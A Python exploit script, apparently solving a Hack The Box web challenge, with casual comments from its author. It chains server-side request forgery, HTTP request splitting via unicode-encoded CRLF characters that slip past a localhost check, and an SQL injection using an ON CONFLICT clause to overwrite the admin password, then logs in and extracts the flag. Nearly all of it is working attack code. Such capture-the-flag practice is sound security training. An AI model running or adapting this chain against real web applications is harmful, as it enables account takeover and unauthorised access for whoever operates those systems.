#!/usr/bin/env python3

import requests
import json
import re

# weird how this is actually categorized as "easy" on HTB, I mean its nothing that hard, especially once you have the whole picture, but its definitely not an "easy" one lol, can't wait to try out the hard/insane ones
# not every beginner knows about SSRFs and HTTP response splitting, not to mention a combination of the 2 + unicode encoding to bypass the 127.0.0.1 check and then perform some sort of SQLi to change admin's password through a ON CONFLICT query like come on HTB :) you really need to redefine what "easy" and "beginner" mean in your book
# btw, I've tried more than a few payloads and only the ON CONFLICT worked for me which I actually didn't know about until this challenge, could've made it a bit easier through a normal ";UPDATE users set password='whatever' where username='admin';-- -" query
# "easy" would've been something like for example directory bruteforce the webapp, find /register, perform an easy SQLi like "' or 1=1-- -", get logged in and find the flag
# ANYWAY, enjoy the exploit hax0r xD
# EDIT: a few hours later, I've figured it out. its the length of the actual username so "admin" + length of the actual password which is our sqli payload + length of the actual parameters as in the string itself "username=&password=", so we dont need to bruteforce anything anymore. was like thinking about the whole thing but was only adding up the actual username + actual password, not also adding up the actual text between them lol.gotta love them brain farts

host = "159.65.26.210:31855" # CHANGE ME
username = "admin"
pwd = "pwned" # CHANGE ME IF YOU WANT TO LOL
password = f"') on conflict (username) do update set password='{pwd}';--".replace(" ","\u0120").replace("'", "%27")
api = "http://" + host + "/api/weather"
login = "http://" + host + "/login"
headers = {"Content-Type":"application/json"}

# \u0120 -> space
# \u010D -> \r
# \u010A -> \n
# https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/

content_length = str(len(username) + len(password) + len("username=&password=")) 
print(f"Trying length: {content_length}", end="\r")

data = {"endpoint":"127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120" + content_length + "\u010D\u010A\u010D\u010Ausername=" + username + "&password=" + password + "\u010D\u010A\u010D\u010AGET\u0120","city":"Nuremberg","country":"DE"}

r1 = requests.post(api, data=json.dumps(data), headers=headers, timeout=1)
if "error" in r1.text:
  print(f"[+] Successfully changed admin's password to '{pwd}'!")
  data = f"username=admin&password={pwd}"
  headers = {"Content-Type":"application/x-www-form-urlencoded"}
  r2 = requests.post(login, headers=headers, data=data)
  flag = re.search("HTB{.*", r2.text)
  print("[+] Here's your flag: " + flag.group(0))
